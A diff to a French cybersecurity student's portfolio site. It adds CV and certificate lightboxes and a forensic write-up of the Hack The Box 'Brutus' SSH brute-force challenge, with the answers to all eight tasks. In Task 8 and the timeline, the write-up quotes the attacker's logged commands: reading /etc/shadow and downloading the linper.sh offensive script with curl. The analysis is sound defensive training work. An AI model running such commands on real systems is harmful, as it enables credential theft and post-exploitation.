@@ -206,6 +206,16 @@
   .stat-card .num .accent{color:var(--accent-2);}
   .stat-card .lbl{font-size:.82rem;color:var(--text-muted);margin-top:4px;}
 
+  .cv-card{
+    margin-top:16px;background:var(--bg-elevated);border:1px solid var(--border);border-radius:14px;
+    padding:18px 20px;display:flex;align-items:center;gap:16px;flex-wrap:wrap;
+  }
+  .cv-card-icon{width:44px;height:44px;border-radius:10px;background:var(--accent-2-soft);color:var(--accent-2);display:flex;align-items:center;justify-content:center;font-size:1.3rem;flex:none;}
+  .cv-card-text{flex:1;min-width:160px;}
+  .cv-card-title{font-weight:700;font-size:.98rem;}
+  .cv-card-sub{color:var(--text-muted);font-size:.84rem;margin-top:2px;}
+  .cv-card-actions{display:flex;gap:10px;flex:none;flex-wrap:wrap;}
+
   .timeline{display:flex;flex-direction:column;gap:0;border-left:1px solid var(--border);margin-left:4px;}
   .tl-item{position:relative;padding:0 0 26px 26px;}
   .tl-item:last-child{padding-bottom:0;}
@@ -277,6 +287,15 @@
   .detail-figures-2{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-top:22px;}
   @media (max-width:640px){ .detail-figures-2{grid-template-columns:1fr;} }
   .detail-figures-2 .detail-figure{margin-top:0;}
+  .task-block{border:1px solid var(--border);border-radius:14px;padding:20px 22px;margin-top:16px;background:var(--bg-elevated);}
+  .task-block .task-num{font-family:var(--font-mono);font-size:.7rem;color:var(--accent-2);letter-spacing:.08em;text-transform:uppercase;}
+  .task-block h3{font-size:1rem;font-weight:700;margin-top:4px;}
+  .task-q{color:var(--text-muted);font-size:.88rem;margin-top:6px;}
+  .cmd-block{background:var(--bg);border:1px solid var(--border-soft);border-radius:9px;padding:12px 14px;font-family:var(--font-mono);font-size:.78rem;color:var(--accent-2);overflow-x:auto;margin-top:12px;white-space:pre-wrap;line-height:1.55;}
+  .result-block{background:var(--bg-elevated-2);border:1px solid var(--border-soft);border-radius:9px;padding:12px 14px;font-family:var(--font-mono);font-size:.78rem;color:var(--text-muted);margin-top:10px;white-space:pre-wrap;line-height:1.55;}
+  .task-explain{color:var(--text-muted);font-size:.88rem;margin-top:12px;}
+  .task-answer{margin-top:14px;display:inline-flex;align-items:center;gap:8px;font-family:var(--font-mono);font-size:.8rem;font-weight:600;color:var(--accent-2);background:var(--accent-2-soft);border-radius:8px;padding:7px 13px;}
+  .task-answer::before{content:"✓";}
   .project-tag{font-family:var(--font-mono);font-size:.7rem;letter-spacing:.06em;text-transform:uppercase;color:var(--accent-2);}
   .project-body h3{font-size:1.08rem;font-weight:700;}
   .project-body p{color:var(--text-muted);font-size:.92rem;}
@@ -302,6 +321,41 @@
   .cert-col.progress .cert-chip{background:transparent;border:1px dashed var(--border);}
   .cert-chip .cert-name{color:var(--text);font-weight:500;}
   .cert-chip .cert-year{font-family:var(--font-mono);font-size:.72rem;color:var(--text-muted);}
+  a.cert-chip{transition:border-color .15s, background .15s;cursor:zoom-in;}
+  a.cert-chip:hover{border-color:var(--accent-2);background:rgba(69,214,192,.16);}
+  a.cert-chip .cert-name::after{content:"⤢";margin-left:6px;color:var(--accent-2);font-weight:400;}
+
+  /* ---------- CERT LIGHTBOX ---------- */
+  .cert-lightbox{
+    position:fixed;inset:0;z-index:200;display:none;
+    background:rgba(6,8,16,.88);backdrop-filter:blur(3px);
+    padding:min(6vh,48px) 20px;overflow-y:auto;
+  }
+  .cert-lightbox.open{display:block;}
+  .cert-lightbox-inner{max-width:900px;margin:0 auto;position:relative;}
+  .cert-lightbox-bar{display:flex;align-items:center;justify-content:space-between;gap:16px;margin-bottom:14px;}
+  .cert-lightbox-name{color:var(--text);font-weight:700;font-family:var(--font-display);font-size:1.05rem;}
+  .cert-lightbox-actions{display:flex;align-items:center;gap:10px;flex:none;}
+  .cert-lightbox-close{
+    background:var(--bg-elevated);border:1px solid var(--border);color:var(--text);
+    width:38px;height:38px;border-radius:9px;cursor:pointer;
+    display:flex;align-items:center;justify-content:center;font-size:1.1rem;flex:none;
+  }
+  .cert-lightbox-close:hover{border-color:var(--accent-2);color:var(--accent-2);}
+  .cert-lightbox-frame{border-radius:14px;overflow:hidden;border:1px solid var(--border);box-shadow:0 30px 70px -20px rgba(0,0,0,.7);background:var(--bg-elevated);}
+  .cert-lightbox-frame img{width:100%;display:block;}
+
+  /* ---------- CV LIGHTBOX ---------- */
+  .cv-lightbox{position:fixed;inset:0;z-index:200;display:none;background:rgba(6,8,16,.88);backdrop-filter:blur(3px);padding:min(4vh,32px) 20px;}
+  .cv-lightbox.open{display:flex;}
+  .cv-lightbox-inner{max-width:900px;width:100%;height:100%;margin:0 auto;display:flex;flex-direction:column;}
+  .cv-lightbox-bar{display:flex;align-items:center;justify-content:space-between;gap:16px;margin-bottom:14px;flex:none;}
+  .cv-lightbox-name{color:var(--text);font-weight:700;font-family:var(--font-display);font-size:1.05rem;}
+  .cv-lightbox-actions{display:flex;align-items:center;gap:10px;flex:none;}
+  .cv-lightbox-close{background:var(--bg-elevated);border:1px solid var(--border);color:var(--text);width:38px;height:38px;border-radius:9px;cursor:pointer;display:flex;align-items:center;justify-content:center;font-size:1.1rem;flex:none;}
+  .cv-lightbox-close:hover{border-color:var(--accent-2);color:var(--accent-2);}
+  .cv-lightbox-frame{flex:1;min-height:0;border-radius:14px;overflow:hidden;border:1px solid var(--border);box-shadow:0 30px 70px -20px rgba(0,0,0,.7);background:#fff;}
+  .cv-lightbox-frame iframe{width:100%;height:100%;border:0;display:block;}
 
   /* ---------- QUOTE ---------- */
   .quote-section{padding-block:64px;}
@@ -455,6 +509,18 @@
           <div class="stat-card"><div class="num tabular">3</div><div class="lbl">Certifications obtenues</div></div>
           <div class="stat-card"><div class="num tabular">5</div><div class="lbl">Certifications en préparation</div></div>
         </div>
+
+        <div class="cv-card reveal">
+          <div class="cv-card-icon">📄</div>
+          <div class="cv-card-text">
+            <div class="cv-card-title">Mon CV</div>
+            <div class="cv-card-sub">Parcours, compétences et expériences en un coup d'œil</div>
+          </div>
+          <div class="cv-card-actions">
+            <button type="button" class="btn btn-ghost btn-sm" id="cvViewBtn">Consulter</button>
+            <a class="btn btn-primary btn-sm" href="cv-dylan-ouaogninlin.pdf" target="_blank" rel="noopener">Télécharger</a>
+          </div>
+        </div>
       </div>
 
       <div class="reveal">
@@ -572,6 +638,32 @@
               <li>Windows Server, Active Directory (OU, GPO, comptes, groupes)</li>
               <li>Scan Nmap, analyse des risques, durcissement (SMBv1 désactivé, RDP restreint)</li>
               <li>Sauvegarde planifiée via Windows Server Backup</li>
+            </ul>
+            <p class="project-more">Voir le détail <span aria-hidden="true">→</span></p>
+          </div>
+        </a>
+
+        <a class="project-card reveal" href="#projet-brutus">
+          <div class="project-visual">
+            <svg viewBox="0 0 100 100" fill="none">
+              <rect x="16" y="14" width="48" height="60" rx="4" fill="#171d33" stroke="#3a4266" stroke-width="1.6"/>
+              <line x1="24" y1="28" x2="56" y2="28" stroke="#7c6cf0" stroke-width="2.2"/>
+              <line x1="24" y1="38" x2="56" y2="38" stroke="#3a4266" stroke-width="2.2"/>
+              <line x1="24" y1="48" x2="48" y2="48" stroke="#3a4266" stroke-width="2.2"/>
+              <line x1="24" y1="58" x2="50" y2="58" stroke="#45d6c0" stroke-width="2.2"/>
+              <circle cx="70" cy="64" r="14" fill="none" stroke="#45d6c0" stroke-width="2.6"/>
+              <line x1="80" y1="74" x2="92" y2="86" stroke="#45d6c0" stroke-width="3.2" stroke-linecap="round"/>
+            </svg>
+          </div>
+          <div class="project-body">
+            <p class="project-tag">Hack The Box — Sherlock DFIR · 2026</p>
+            <h3>Investigation forensique — Brutus</h3>
+            <p>Analyse forensique d'une compromission SSH par force brute sur un serveur Linux : reconstruction de la chronologie d'attaque à partir des journaux <code>auth.log</code> et <code>wtmp</code>.</p>
+            <ul class="project-list">
+              <li>Identification de l'attaquant et du compte compromis par analyse de logs</li>
+              <li>Décodage d'un fichier binaire wtmp et corrélation d'horodatages/PID</li>
+              <li>Détection de la persistance et classification MITRE ATT&amp;CK</li>
+              <li>Reconstruction complète de la timeline d'incident</li>
             </ul>
             <p class="project-more">Voir le détail <span aria-hidden="true">→</span></p>
           </div>
@@ -809,6 +901,216 @@
     </div>
   </section>
 
+  <section class="page" id="projet-brutus">
+    <div class="wrap" style="padding-block:56px 90px;">
+      <a class="detail-back reveal" href="#projets">← Retour aux projets</a>
+      <div class="detail-head reveal">
+        <span class="detail-icon">
+          <svg viewBox="0 0 100 100" fill="none">
+            <rect x="16" y="14" width="48" height="60" rx="4" fill="#171d33" stroke="#3a4266" stroke-width="1.6"/>
+            <line x1="24" y1="28" x2="56" y2="28" stroke="#7c6cf0" stroke-width="2.2"/>
+            <line x1="24" y1="38" x2="56" y2="38" stroke="#3a4266" stroke-width="2.2"/>
+            <line x1="24" y1="48" x2="48" y2="48" stroke="#3a4266" stroke-width="2.2"/>
+            <line x1="24" y1="58" x2="50" y2="58" stroke="#45d6c0" stroke-width="2.2"/>
+            <circle cx="70" cy="64" r="14" fill="none" stroke="#45d6c0" stroke-width="2.6"/>
+            <line x1="80" y1="74" x2="92" y2="86" stroke="#45d6c0" stroke-width="3.2" stroke-linecap="round"/>
+          </svg>
+        </span>
+        <div>
+          <p class="project-tag">Hack The Box — Sherlock DFIR · 2026</p>
+          <h1 style="font-size:clamp(1.6rem,3vw,2.1rem);font-weight:800;margin-top:4px;">Investigation forensique — Brutus</h1>
+        </div>
+      </div>
+
+      <div class="detail-body reveal">
+        <p>Rapport d'investigation numérique réalisé dans le cadre du Sherlock « Brutus » (Hack The Box, difficulté très facile) : un serveur Confluence compromis par une attaque par force brute sur son service SSH. Objectif : reconstituer la chronologie complète de l'attaque à partir de deux artefacts bruts — le journal d'authentification <code>auth.log</code> et le fichier binaire de sessions <code>wtmp</code> — en identifiant l'attaquant, le compte compromis, le mécanisme de persistance mis en place et les actions post-exploitation.</p>
+
+        <div class="detail-meta">
+          <span>Forensique Linux</span>
+          <span>auth.log</span>
+          <span>wtmp</span>
+          <span>grep · awk · sort</span>
+          <span>Python</span>
+          <span>MITRE ATT&amp;CK</span>
+        </div>
+
+        <figure class="detail-figure">
+          <img src="assets/htb-brutus.jpg" alt="Page du challenge Sherlock Brutus sur Hack The Box">
+          <figcaption>Sherlock « Brutus » — Hack The Box, plateforme HTB Labs</figcaption>
+        </figure>
+
+        <div class="detail-block">
+          <h2>Contexte et artefacts fournis</h2>
+          <p>Un serveur Confluence a été compromis via une attaque par force brute sur son service SSH. Deux artefacts ont été fournis pour reconstituer la chronologie de l'attaque : <code>auth.log</code>, fichier texte Linux journalisant toute authentification (SSH, sudo, cron) au format date/heure, hostname, service, PID, message ; et <code>wtmp</code>, fichier binaire enregistrant les ouvertures et fermetures de sessions, illisible en texte brut et décodé via un script Python fourni (<code>utmp.py</code>).</p>
+        </div>
+
+        <div class="detail-block">
+          <h2>Méthodologie</h2>
+          <p>Chaque tâche suit le même schéma : filtrer (<code>grep</code> par mot-clé) → extraire (<code>awk</code> / lecture directe clé=valeur) → corréler (tri, comptage, ou croisement d'horodatages et de PID entre <code>auth.log</code> et <code>wtmp</code>). Le PID (numéro entre crochets) s'est révélé être le fil conducteur le plus fiable pour relier deux événements distincts à la même connexion.</p>
+        </div>
+
+        <div class="detail-block">
+          <h2>Investigation — 8 tâches résolues</h2>
+
+          <div class="task-block">
+            <span class="task-num">Tâche 1 / 8</span>
+            <h3>Identifier l'IP de l'attaquant</h3>
+            <p class="task-q">Quelle est l'adresse IP utilisée par l'attaquant pour mener l'attaque par force brute ?</p>
+            <div class="cmd-block">grep "Failed password" auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head</div>
+            <div class="result-block">48  65.2.161.68</div>
+            <p class="task-explain"><code>grep</code> filtre les échecs d'authentification SSH. <code>awk '{print $(NF-3)}'</code> extrait l'IP, positionnée 3 champs avant la fin — position stable quelle que soit la longueur du reste de la ligne. Le tri par fréquence fait ressortir une IP dominante avec 48 tentatives en quelques secondes, un rythme impossible pour une saisie humaine : signature d'un outil automatisé (Hydra, Medusa, Brutus...).</p>
+            <div class="task-answer">65.2.161.68</div>
+          </div>
+
+          <div class="task-block">
+            <span class="task-num">Tâche 2 / 8</span>
+            <h3>Identifier le compte compromis</h3>
+            <p class="task-q">Le bruteforce a réussi. Quel est le nom d'utilisateur du compte compromis ?</p>
+            <div class="cmd-block">grep "Accepted password" auth.log</div>
+            <div class="result-block">06:19:54  root  from 203.101.190.9  (IP différente)
+06:31:40  root  from 65.2.161.68  ← IP attaquant
+06:32:44  root  from 65.2.161.68  ← IP attaquant
+06:37:34  cyberjunkie  from 65.2.161.68</div>
+            <p class="task-explain">« Accepted password » est le marqueur écrit par sshd lors d'une authentification réussie. Parmi les connexions réussies, celles provenant de l'IP de l'attaquant concernent le compte root — la connexion et la fermeture de session surviennent à la même seconde pour la première tentative, signe supplémentaire d'un outil automatisé.</p>
+            <div class="task-answer">root</div>
+          </div>
+
+          <div class="task-block">
+            <span class="task-num">Tâche 3 / 8</span>
+            <h3>Horodatage de la connexion manuelle (wtmp)</h3>
+            <p class="task-q">À quel horodatage UTC l'attaquant s'est-il connecté manuellement et a établi une session terminale, différent de l'horodatage d'authentification SSH ?</p>
+            <div class="cmd-block">python3 utmp.py -o wtmp.out wtmp</div>
+            <div class="result-block">"USER"  2549  pts/1  root  65.2.161.68  2024/03/06 06:32:45</div>
+            <p class="task-explain"><code>utmp.py</code> décode le format binaire de wtmp en tableau lisible. On y cherche les lignes de type « USER » (session active établie) liées à l'IP de l'attaquant et au compte root. Point clé : auth.log enregistre l'instant d'authentification, tandis que wtmp enregistre la création réelle du terminal (pty) — deux événements distincts, séparés ici d'environ une minute.</p>
+            <div class="task-answer">2024-03-06 06:32:45 UTC</div>
+          </div>
+
+          <div class="task-block">
+            <span class="task-num">Tâche 4 / 8</span>
+            <h3>Numéro de session SSH de l'attaquant</h3>
+            <p class="task-q">Quel est le numéro de session attribué à la connexion de l'attaquant pour le compte identifié en tâche 2 ?</p>
+            <div class="cmd-block">grep "New session" auth.log</div>
+            <div class="result-block">06:19:54  New session 6 of user root.   (autre IP, écartée)
+06:31:40  New session 34 of user root.  (connexion-test brute force)
+06:32:44  New session 37 of user root.  ← session réelle
+06:37:34  New session 49 of user cyberjunkie.</div>
+            <p class="task-explain">systemd-logind attribue et journalise un numéro de session unique. La session 34 correspond à la connexion-test de l'outil de brute force (ouverte et refermée à la même seconde, sans activité). La session 37 correspond à la connexion manuelle réelle, confirmée en tâche 3 via wtmp, ensuite utilisée pour agir sur le système.</p>
+            <div class="task-answer">37</div>
+          </div>
+
+          <div class="task-block">
+            <span class="task-num">Tâche 5 / 8</span>
+            <h3>Compte créé pour la persistance</h3>
+            <p class="task-q">L'attaquant a créé un nouveau compte à privilèges élevés pour assurer sa persistance. Quel est son nom ?</p>
+            <div class="cmd-block">grep "useradd" auth.log</div>
+            <div class="result-block">useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002,
+home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1</div>
+            <p class="task-explain">Format clé=valeur directement lisible. Le champ <code>from=/dev/pts/1</code> confirme que la commande a été exécutée depuis le terminal de la session de l'attaquant (session 37). Les logs montrent ensuite l'ajout de ce compte au groupe sudo via <code>usermod</code>, lui conférant des privilèges administrateur complets.</p>
+            <div class="task-answer">cyberjunkie</div>
+          </div>
+
+          <div class="task-block">
+            <span class="task-num">Tâche 6 / 8</span>
+            <h3>Sous-technique MITRE ATT&amp;CK</h3>
+            <p class="task-q">Quel est l'identifiant de sous-technique MITRE ATT&amp;CK utilisé pour la persistance via création de compte ?</p>
+            <p class="task-explain">Recherche documentaire dans le référentiel MITRE ATT&amp;CK Enterprise Matrix : tactique Persistence → technique Create Account (T1136) → sous-technique selon le type de compte. Le compte cyberjunkie étant un compte local sur la machine compromise (et non un compte de domaine ou cloud), la sous-technique correspondante est Local Account.</p>
+            <div class="task-answer">T1136.001</div>
+          </div>
+
+          <div class="task-block">
+            <span class="task-num">Tâche 7 / 8</span>
+            <h3>Fin de la première session SSH réellement utilisée</h3>
+            <p class="task-q">À quelle heure la première session SSH de l'attaquant s'est-elle terminée, selon auth.log ?</p>
+            <div class="cmd-block">grep "session closed" auth.log</div>
+            <div class="result-block">sshd[2411]: session closed for user root  → 06:31:40 (même seconde que l'ouverture)
+sshd[2491]: session closed for user root  → 06:37:24 ← session 37</div>
+            <p class="task-explain">Après élimination du bruit (tâches CRON automatiques, sans rapport), deux lignes restent liées à sshd + root. Le PID 2411 correspond à la connexion-test du bruteforceur (session 34) : ouverte et fermée à la même seconde, sans usage réel. Le PID 2491 correspond à la session 37, la première véritablement utilisée par l'attaquant — c'est donc sa fermeture qui répond à la question.</p>
+            <div class="task-answer">2024-03-06 06:37:24 UTC</div>
+          </div>
+
+          <div class="task-block">
+            <span class="task-num">Tâche 8 / 8</span>
+            <h3>Commande sudo de téléchargement du script</h3>
+            <p class="task-q">L'attaquant s'est connecté à son compte backdoor et a utilisé sudo. Quelle est la commande complète exécutée ?</p>
+            <div class="cmd-block">grep "COMMAND=" auth.log</div>
+            <div class="result-block">sudo: cyberjunkie : ... COMMAND=/usr/bin/cat /etc/shadow
+sudo: cyberjunkie : ... COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh</div>
+            <p class="task-explain">sudo journalise chaque commande exécutée avec privilèges élevés. Deux actions apparaissent : une lecture de /etc/shadow (reconnaissance / collecte des hashs de mots de passe) et un téléchargement via curl d'un script offensif connu (linper.sh, outil de reconnaissance et d'élévation de privilèges Linux) — c'est cette seconde commande qui répond à la question.</p>
+            <div class="task-answer">/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh</div>
+          </div>
+        </div>
+
+        <div class="detail-block">
+          <h2>Synthèse — chronologie de l'incident</h2>
+          <div class="timeline">
+            <div class="tl-item">
+              <div class="tl-date">06:31:31 – 06:31:39 UTC</div>
+              <div class="tl-title">Brute force SSH massif depuis 65.2.161.68</div>
+              <div class="tl-org">48+ tentatives en quelques secondes</div>
+            </div>
+            <div class="tl-item">
+              <div class="tl-date">06:31:40 UTC</div>
+              <div class="tl-title">Authentification réussie sur root</div>
+              <div class="tl-org">Session 34 — connexion-test de l'outil de brute force</div>
+            </div>
+            <div class="tl-item">
+              <div class="tl-date">06:32:44 – 06:32:45 UTC</div>
+              <div class="tl-title">Connexion manuelle réelle sur root</div>
+              <div class="tl-org">Session 37 — terminal établi (confirmé via wtmp)</div>
+            </div>
+            <div class="tl-item">
+              <div class="tl-date">06:34:18 UTC</div>
+              <div class="tl-title">Création du compte de persistance cyberjunkie</div>
+              <div class="tl-org">UID 1002, shell /bin/bash</div>
+            </div>
+            <div class="tl-item">
+              <div class="tl-date">06:35:15 UTC</div>
+              <div class="tl-title">Ajout de cyberjunkie au groupe sudo</div>
+              <div class="tl-org">Élévation de privilèges pour le compte de persistance</div>
+            </div>
+            <div class="tl-item">
+              <div class="tl-date">06:37:24 UTC</div>
+              <div class="tl-title">Fin de la session root (session 37)</div>
+              <div class="tl-org"></div>
+            </div>
+            <div class="tl-item">
+              <div class="tl-date">06:37:34 UTC</div>
+              <div class="tl-title">Connexion sur le compte backdoor cyberjunkie</div>
+              <div class="tl-org"></div>
+            </div>
+            <div class="tl-item">
+              <div class="tl-date">06:37:57 UTC</div>
+              <div class="tl-title">sudo cat /etc/shadow</div>
+              <div class="tl-org">Reconnaissance — collecte des hashs de mots de passe</div>
+            </div>
+            <div class="tl-item">
+              <div class="tl-date">06:39:38 UTC</div>
+              <div class="tl-title">sudo curl .../linper.sh</div>
+              <div class="tl-org">Téléchargement d'un outil offensif de post-exploitation</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="detail-block">
+          <h2>Compétences pratiquées</h2>
+          <ul class="detail-list">
+            <li>Lecture et filtrage de logs Unix (grep, awk, sort, uniq)</li>
+            <li>Analyse d'un fichier binaire (wtmp) via un script Python dédié</li>
+            <li>Détection de brute force par fréquence et motif des tentatives</li>
+            <li>Corrélation d'horodatages et de PID entre plusieurs sources de logs</li>
+            <li>Reconstruction de timeline d'incident et classification MITRE ATT&amp;CK</li>
+            <li>Analyse post-exploitation (persistance, élévation de privilèges, exécution de commandes)</li>
+          </ul>
+        </div>
+
+        <div class="detail-block">
+          <h2>Résultat</h2>
+          <p>Investigation complète menée à partir de deux artefacts bruts — un journal texte et un fichier binaire — avec pour seuls outils un terminal Linux et un script Python fourni. Les 8 questions du Sherlock ont été résolues et documentées : identification de l'attaquant et du vecteur d'accès, reconstruction de la chronologie complète, détection du mécanisme de persistance et classification MITRE ATT&amp;CK associée (T1136.001).</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
   <section class="page" id="certifications">
     <div class="wrap page-head reveal">
       <p class="eyebrow">Certifications</p>
@@ -823,8 +1125,12 @@
             <h3>Obtenues</h3>
           </div>
           <div class="cert-chip"><span class="cert-name">EHE — Ethical Hacking Essentials</span></div>
-          <div class="cert-chip"><span class="cert-name">GSIMEL — Espionnage &amp; Contre-espionnage</span></div>
-          <div class="cert-chip"><span class="cert-name">GSIMEL — Cybersécurité professionnelle</span></div>
+          <a class="cert-chip" href="assets/cert-security-plus.pdf" target="_blank" rel="noopener" data-cert-img="assets/cert-security-plus.jpg" data-cert-name="CompTIA Security+ (GSIMEL)"><span class="cert-name">CompTIA Security+ (GSIMEL)</span></a>
+          <a class="cert-chip" href="assets/cert-network-plus.pdf" target="_blank" rel="noopener" data-cert-img="assets/cert-network-plus.jpg" data-cert-name="CompTIA Network+ (GSIMEL)"><span class="cert-name">CompTIA Network+ (GSIMEL)</span></a>
+          <a class="cert-chip" href="assets/cert-server-plus.pdf" target="_blank" rel="noopener" data-cert-img="assets/cert-server-plus.jpg" data-cert-name="CompTIA Server+ (GSIMEL)"><span class="cert-name">CompTIA Server+ (GSIMEL)</span></a>
+          <a class="cert-chip" href="assets/cert-espionnage.pdf" target="_blank" rel="noopener" data-cert-img="assets/cert-espionnage.jpg" data-cert-name="GSIMEL — Espionnage &amp; Contre-espionnage"><span class="cert-name">GSIMEL — Espionnage &amp; Contre-espionnage</span></a>
+          <a class="cert-chip" href="assets/cert-cybersecurite-globale.pdf" target="_blank" rel="noopener" data-cert-img="assets/cert-cybersecurite-globale.jpg" data-cert-name="GSIMEL — Cybersécurité professionnelle"><span class="cert-name">GSIMEL — Cybersécurité professionnelle</span></a>
+          <a class="cert-chip" href="assets/cert-isc2-cc.pdf" target="_blank" rel="noopener" data-cert-img="assets/cert-isc2-cc.jpg" data-cert-name="ISC2 — CC (pre-assessment)"><span class="cert-name">ISC2 — CC (pre-assessment)</span></a>
         </div>
 
         <div class="cert-col progress reveal">
@@ -833,9 +1139,6 @@
             <h3>En préparation</h3>
           </div>
           <div class="cert-chip"><span class="cert-name">CEH — Certified Ethical Hacker</span><span class="cert-year tabular">2026</span></div>
-          <div class="cert-chip"><span class="cert-name">CompTIA Security+</span><span class="cert-year tabular">2026</span></div>
-          <div class="cert-chip"><span class="cert-name">CompTIA Network+</span><span class="cert-year tabular">2026</span></div>
-          <div class="cert-chip"><span class="cert-name">CompTIA Server+</span><span class="cert-year tabular">2026</span></div>
           <div class="cert-chip"><span class="cert-name">CAPT — Certified Advanced Penetration Tester</span><span class="cert-year tabular">2026</span></div>
         </div>
       </div>
@@ -882,6 +1185,36 @@
       </div>
     </div>
   </section>
+
+  <div class="cert-lightbox" id="certLightbox" role="dialog" aria-modal="true" aria-label="Aperçu du certificat">
+    <div class="cert-lightbox-inner">
+      <div class="cert-lightbox-bar">
+        <span class="cert-lightbox-name" id="certLightboxName"></span>
+        <div class="cert-lightbox-actions">
+          <a class="btn btn-ghost btn-sm" id="certLightboxPdf" href="#" target="_blank" rel="noopener">PDF original</a>
+          <button type="button" class="cert-lightbox-close" id="certLightboxClose" aria-label="Fermer">✕</button>
+        </div>
+      </div>
+      <div class="cert-lightbox-frame">
+        <img id="certLightboxImg" src="" alt="Certificat en plein format">
+      </div>
+    </div>
+  </div>
+
+  <div class="cv-lightbox" id="cvLightbox" role="dialog" aria-modal="true" aria-label="Aperçu du CV">
+    <div class="cv-lightbox-inner">
+      <div class="cv-lightbox-bar">
+        <span class="cv-lightbox-name">CV — Dylan Ouaogninlin</span>
+        <div class="cv-lightbox-actions">
+          <a class="btn btn-ghost btn-sm" href="cv-dylan-ouaogninlin.pdf" target="_blank" rel="noopener">Ouvrir dans un onglet</a>
+          <button type="button" class="cv-lightbox-close" id="cvLightboxClose" aria-label="Fermer">✕</button>
+        </div>
+      </div>
+      <div class="cv-lightbox-frame">
+        <iframe src="cv-dylan-ouaogninlin.pdf" title="CV de Dylan Ouaogninlin"></iframe>
+      </div>
+    </div>
+  </div>
 </main>
 
 <footer>
@@ -914,7 +1247,7 @@
 
   // ---- page router ----
   var NAV_PAGES = ['accueil', 'a-propos', 'projets', 'certifications', 'contact'];
-  var DETAIL_PAGES = ['projet-infra'];
+  var DETAIL_PAGES = ['projet-infra', 'projet-brutus'];
   var PAGES = NAV_PAGES.concat(DETAIL_PAGES);
   var pageEls = {};
   PAGES.forEach(function (id) { pageEls[id] = document.getElementById(id); });
@@ -951,4 +1284,73 @@
 
   window.addEventListener('hashchange', function () { showPage(currentPageFromHash()); });
   showPage(currentPageFromHash());
+
+  // ---- certification lightbox ----
+  var certLightbox = document.getElementById('certLightbox');
+  var certLightboxImg = document.getElementById('certLightboxImg');
+  var certLightboxName = document.getElementById('certLightboxName');
+  var certLightboxPdf = document.getElementById('certLightboxPdf');
+  var certLightboxClose = document.getElementById('certLightboxClose');
+  var lastCertTrigger = null;
+
+  function openCertLightbox(trigger) {
+    var img = trigger.getAttribute('data-cert-img');
+    if (!img) { return; }
+    lastCertTrigger = trigger;
+    certLightboxImg.src = img;
+    certLightboxName.textContent = trigger.getAttribute('data-cert-name') || '';
+    certLightboxPdf.href = trigger.getAttribute('href');
+    certLightbox.classList.add('open');
+    document.body.style.overflow = 'hidden';
+  }
+
+  function closeCertLightbox() {
+    certLightbox.classList.remove('open');
+    document.body.style.overflow = '';
+    certLightboxImg.src = '';
+    if (lastCertTrigger) { lastCertTrigger.focus(); }
+  }
+
+  document.querySelectorAll('.cert-chip[data-cert-img]').forEach(function (chip) {
+    chip.addEventListener('click', function (e) {
+      e.preventDefault();
+      openCertLightbox(chip);
+    });
+  });
+
+  if (certLightboxClose) { certLightboxClose.addEventListener('click', closeCertLightbox); }
+  if (certLightbox) {
+    certLightbox.addEventListener('click', function (e) {
+      if (e.target === certLightbox) { closeCertLightbox(); }
+    });
+  }
+  window.addEventListener('keydown', function (e) {
+    if (e.key === 'Escape' && certLightbox.classList.contains('open')) { closeCertLightbox(); }
+  });
+
+  // ---- CV lightbox ----
+  var cvLightbox = document.getElementById('cvLightbox');
+  var cvViewBtn = document.getElementById('cvViewBtn');
+  var cvLightboxClose = document.getElementById('cvLightboxClose');
+
+  function openCvLightbox() {
+    cvLightbox.classList.add('open');
+    document.body.style.overflow = 'hidden';
+  }
+
+  function closeCvLightbox() {
+    cvLightbox.classList.remove('open');
+    document.body.style.overflow = '';
+  }
+
+  if (cvViewBtn) { cvViewBtn.addEventListener('click', openCvLightbox); }
+  if (cvLightboxClose) { cvLightboxClose.addEventListener('click', closeCvLightbox); }
+  if (cvLightbox) {
+    cvLightbox.addEventListener('click', function (e) {
+      if (e.target === cvLightbox) { closeCvLightbox(); }
+    });
+  }
+  window.addEventListener('keydown', function (e) {
+    if (e.key === 'Escape' && cvLightbox.classList.contains('open')) { closeCvLightbox(); }
+  });
 </script>
